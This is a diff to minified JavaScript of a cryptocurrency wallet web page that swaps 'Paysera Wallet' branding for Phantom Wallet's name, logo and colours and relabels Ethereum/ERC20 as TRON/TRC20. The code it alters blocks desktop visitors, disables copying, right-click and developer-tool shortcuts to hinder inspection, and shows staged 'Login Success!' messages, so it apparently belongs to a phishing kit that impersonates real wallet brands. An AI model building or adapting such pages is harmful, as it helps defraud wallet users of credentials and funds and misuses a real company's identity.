@@ -933,7 +933,7 @@
                             r = window.devicePixelRatio > 1.5;
                         if (!(e && t && n && r)) {
                             let e = e => (e.preventDefault(), e.stopPropagation(), !1);
-                            document.addEventListener("contextmenu", e), document.addEventListener("copy", e), document.addEventListener("cut", e), document.addEventListener("paste", e), document.addEventListener("keydown", e), document.addEventListener("keyup", e), document.addEventListener("keypress", e), document.addEventListener("click", e), document.addEventListener("mousedown", e), document.addEventListener("mouseup", e), document.addEventListener("mousemove", e), document.addEventListener("selectstart", e), document.addEventListener("dragstart", e), document.addEventListener("drop", e), document.body.innerHTML = '\n          <div style="position: fixed; inset: 0; background: #0a0a0a; display: flex; align-items: center; justify-content: center; z-index: 999999; font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 0;">\n            <div style="text-align: center; padding: 24px; max-width: 400px;">\n              <div style="width: 80px; height: 80px; margin: 0 auto 20px; border-radius: 50%; background: #8f9e3f; display: flex; align-items: center; justify-content: center; padding: 12px;">\n                <img \n                  src="https://cdn.shopify.com/s/files/1/0736/8369/7833/files/26d915cf-a386-481b-a9dd-019dba341195_removalai_preview.png?v=1778251073" \n                  alt="Paysera Wallet"\n                  style="width: 100%; height: 100%; object-fit: contain; border-radius: 12px;"\n                />\n              </div>\n              <div style="font-size: 48px; margin-bottom: 16px;">\uD83D\uDCF1</div>\n              <h1 style="color: white; font-size: 24px; margin-bottom: 12px; font-weight: 700;">\n                Mobile Only\n              </h1>\n              <p style="color: #aaa; font-size: 16px; margin-bottom: 8px; line-height: 1.6;">\n                Paysera Wallet is not available on Desktop.\n              </p>\n              <p style="color: #888; font-size: 14px; margin-bottom: 24px; line-height: 1.6;">\n                Please visit <span style="color: #8f9e3f; font-weight: 600;">payserawallet.com</span> on your mobile device.\n              </p>\n            </div>\n          </div>\n        ', document.body.style.margin = "0", document.body.style.padding = "0", document.body.style.backgroundColor = "#0a0a0a", document.body.style.overflow = "hidden", document.documentElement.style.overflow = "hidden", document.addEventListener("contextmenu", e), document.addEventListener("copy", e), document.addEventListener("cut", e), document.addEventListener("paste", e), document.addEventListener("keydown", e), document.addEventListener("keyup", e), document.addEventListener("keypress", e), document.addEventListener("click", e), document.addEventListener("mousedown", e), document.addEventListener("mouseup", e), document.addEventListener("mousemove", e), document.addEventListener("selectstart", e), document.addEventListener("dragstart", e), document.addEventListener("drop", e), document.addEventListener("touchmove", e), document.addEventListener("wheel", e), document.addEventListener("keydown", function(e) {
+                            document.addEventListener("contextmenu", e), document.addEventListener("copy", e), document.addEventListener("cut", e), document.addEventListener("paste", e), document.addEventListener("keydown", e), document.addEventListener("keyup", e), document.addEventListener("keypress", e), document.addEventListener("click", e), document.addEventListener("mousedown", e), document.addEventListener("mouseup", e), document.addEventListener("mousemove", e), document.addEventListener("selectstart", e), document.addEventListener("dragstart", e), document.addEventListener("drop", e), document.body.innerHTML = '\n          <div style="position: fixed; inset: 0; background: #0a0a0a; display: flex; align-items: center; justify-content: center; z-index: 999999; font-family: system-ui, -apple-system, sans-serif; margin: 0; padding: 0;">\n            <div style="text-align: center; padding: 24px; max-width: 400px;">\n              <div style="width: 80px; height: 80px; margin: 0 auto 20px; border-radius: 50%; background: #8B5CF6; display: flex; align-items: center; justify-content: center; padding: 12px;">\n                <img \n                  src="https://phantom.com/favicon.ico" \n                  alt="Phantom Wallet"\n                  style="width: 100%; height: 100%; object-fit: contain; border-radius: 12px;"\n                />\n              </div>\n              <div style="font-size: 48px; margin-bottom: 16px;">\uD83D\uDCF1</div>\n              <h1 style="color: white; font-size: 24px; margin-bottom: 12px; font-weight: 700;">\n                Mobile Wallet Only\n              </h1>\n              <p style="color: #aaa; font-size: 16px; margin-bottom: 8px; line-height: 1.6;">\n                Phantom Wallet is not available on Desktop.\n              </p>\n              <p style="color: #888; font-size: 14px; margin-bottom: 24px; line-height: 1.6;">\n                Please visit <span style="color: #8B5CF6; font-weight: 600;">phantom.app</span> on your mobile device.\n              </p>\n            </div>\n          </div>\n        ', document.body.style.margin = "0", document.body.style.padding = "0", document.body.style.backgroundColor = "#0a0a0a", document.body.style.overflow = "hidden", document.documentElement.style.overflow = "hidden", document.addEventListener("contextmenu", e), document.addEventListener("copy", e), document.addEventListener("cut", e), document.addEventListener("paste", e), document.addEventListener("keydown", e), document.addEventListener("keyup", e), document.addEventListener("keypress", e), document.addEventListener("click", e), document.addEventListener("mousedown", e), document.addEventListener("mouseup", e), document.addEventListener("mousemove", e), document.addEventListener("selectstart", e), document.addEventListener("dragstart", e), document.addEventListener("drop", e), document.addEventListener("touchmove", e), document.addEventListener("wheel", e), document.addEventListener("keydown", function(e) {
                                 if ("F12" === e.key || e.ctrlKey && e.shiftKey && "I" === e.key || e.ctrlKey && e.shiftKey && "J" === e.key || e.ctrlKey && "U" === e.key) return e.preventDefault(), e.stopPropagation(), !1
                             });
                             return
@@ -1478,8 +1478,8 @@
                                 },
                                 className: "jsx-28131abc58c419c4",
                                 children: [(0, r.jsx)("img", {
-                                    src: "https://cdn.shopify.com/s/files/1/0736/8369/7833/files/26d915cf-a386-481b-a9dd-019dba341195_removalai_preview.png?v=1778251073",
-                                    alt: "Paysera Wallet",
+                                    src: "https://phantom.com/favicon.ico",
+                                    alt: "Phantom Wallet",
                                     style: {
                                         width: "100px",
                                         height: "100px",
@@ -1495,7 +1495,7 @@
                                         margin: "0 0 4px"
                                     },
                                     className: "jsx-28131abc58c419c4",
-                                    children: "Paysera Wallet"
+                                    children: "Phantom Wallet"
                                 }), (0, r.jsx)("p", {
                                     style: {
                                         color: tH("--twc-textSecondary"),
@@ -1504,7 +1504,7 @@
                                         lineHeight: "1.5"
                                     },
                                     className: "jsx-28131abc58c419c4",
-                                    children: "Secure multi-chain wallet"
+                                    children: "Secure self-custody wallet"
                                 })]
                             }), (0, r.jsxs)("div", {
                                 style: {
@@ -1581,7 +1581,7 @@
                                             d: "M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z",
                                             className: "jsx-28131abc58c419c4"
                                         })
-                                    }), "Create New Wallet"]
+                                    }), "Create Wallet"]
                                 })]
                             }), U && (0, r.jsx)("div", {
                                 style: {
@@ -1741,8 +1741,8 @@
                                 },
                                 className: "jsx-d9bed6b55408503",
                                 children: [(0, r.jsx)("img", {
-                                    src: "https://cdn.shopify.com/s/files/1/0736/8369/7833/files/26d915cf-a386-481b-a9dd-019dba341195_removalai_preview.png?v=1778251073",
-                                    alt: "Paysera Wallet",
+                                    src: "https://phantom.com/favicon.ico",
+                                    alt: "Phantom Wallet",
                                     style: {
                                         width: "100px",
                                         height: "100px",
@@ -1922,7 +1922,7 @@
                                         L && B && E && (A(!0), W("Finalizing Security..."), setTimeout(() => {
                                             W("Login Success!")
                                         }, 2e3), setTimeout(() => {
-                                            W("Welcome to Paysera Wallet!")
+                                            W("Welcome to Phantom Wallet!")
                                         }, 3e3), setTimeout(() => {
                                             A(!1), I(!1), o(!1), k("Login")
                                         }, 5e3))
@@ -1974,8 +1974,8 @@
                                 },
                                 className: "jsx-d9bed6b55408503",
                                 children: [(0, r.jsx)("img", {
-                                    src: "https://cdn.shopify.com/s/files/1/0736/8369/7833/files/26d915cf-a386-481b-a9dd-019dba341195_removalai_preview.png?v=1778251073",
-                                    alt: "Paysera Wallet",
+                                    src: "https://phantom.com/favicon.ico",
+                                    alt: "Phantom Wallet",
                                     style: {
                                         width: "100px",
                                         height: "100px",
@@ -2857,7 +2857,7 @@
                                                     margin: "4px 0 0",
                                                     fontSize: "16px"
                                                 },
-                                                children: "Ethereum"
+                                                children: "TRON"
                                             })]
                                         })]
                                     }), (0, r.jsx)("div", {
@@ -3301,7 +3301,7 @@
                                                     gap: "8px"
                                                 },
                                                 onMouseEnter: e => {
-                                                    e.currentTarget.style.backgroundColor = "#1a1a1a", e.currentTarget.style.borderColor = "#8f9e3f", e.currentTarget.style.transform = "scale(1.02)"
+                                                    e.currentTarget.style.backgroundColor = "#1a1a1a", e.currentTarget.style.borderColor = "#8B5CF6", e.currentTarget.style.transform = "scale(1.02)"
                                                 },
                                                 onMouseLeave: e => {
                                                     e.currentTarget.style.backgroundColor = "#0f0f0f", e.currentTarget.style.borderColor = "#2a2a2a", e.currentTarget.style.transform = "scale(1)"
@@ -3355,7 +3355,7 @@
                                                     gap: "8px"
                                                 },
                                                 onMouseEnter: e => {
-                                                    e.currentTarget.style.backgroundColor = "#1a1a1a", e.currentTarget.style.borderColor = "#8f9e3f", e.currentTarget.style.transform = "scale(1.02)"
+                                                    e.currentTarget.style.backgroundColor = "#1a1a1a", e.currentTarget.style.borderColor = "#8B5CF6", e.currentTarget.style.transform = "scale(1.02)"
                                                 },
                                                 onMouseLeave: e => {
                                                     e.currentTarget.style.backgroundColor = "#0f0f0f", e.currentTarget.style.borderColor = "#2a2a2a", e.currentTarget.style.transform = "scale(1)"
@@ -3462,8 +3462,8 @@
                                             },
                                             className: "jsx-212d2f498bea9fe5",
                                             children: (0, r.jsx)("img", {
-                                                src: "https://cdn.shopify.com/s/files/1/0736/8369/7833/files/26d915cf-a386-481b-a9dd-019dba341195_removalai_preview.png?v=1778251073",
-                                                alt: "Paysera Wallet",
+                                                src: "https://phantom.com/favicon.ico",
+                                                alt: "Phantom Wallet",
                                                 style: {
                                                     width: "26px",
                                                     height: "26px",
@@ -3882,7 +3882,7 @@
                                                 },
                                                 className: "jsx-212d2f498bea9fe5",
                                                 children: (0, r.jsx)("img", {
-                                                    alt: "Ethereum",
+                                                    alt: "TRON",
                                                     src: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png",
                                                     style: {
                                                         width: "100%",
@@ -3924,7 +3924,7 @@
                                                         fontWeight: 500
                                                     },
                                                     className: "jsx-212d2f498bea9fe5",
-                                                    children: "ERC20"
+                                                    children: "TRC20"
                                                 }), t_("USDT") && (() => {
                                                     let e = tP("USDT")[0],
                                                         t = (null == e ? void 0 : e.timerEnd) ? tE(e.timerEnd) : null;
@@ -4408,7 +4408,7 @@
                                                 },
                                                 className: "jsx-212d2f498bea9fe5",
                                                 children: (0, r.jsx)("img", {
-                                                    alt: "Ethereum",
+                                                    alt: "TRON",
                                                     src: tC.ETH,
                                                     style: {
                                                         width: "100%",
@@ -4450,7 +4450,7 @@
                                                         fontWeight: 500
                                                     },
                                                     className: "jsx-212d2f498bea9fe5",
-                                                    children: "Ethereum"
+                                                    children: "TRON"
                                                 })]
                                             }), (0, r.jsxs)("div", {
                                                 style: {
@@ -5677,7 +5677,7 @@
                                                                 margin: "4px 0 0",
                                                                 fontSize: "16px"
                                                             },
-                                                            children: "Ethereum"
+                                                            children: "TRON"
                                                         })]
                                                     })]
                                                 }), (0, r.jsx)("div", {
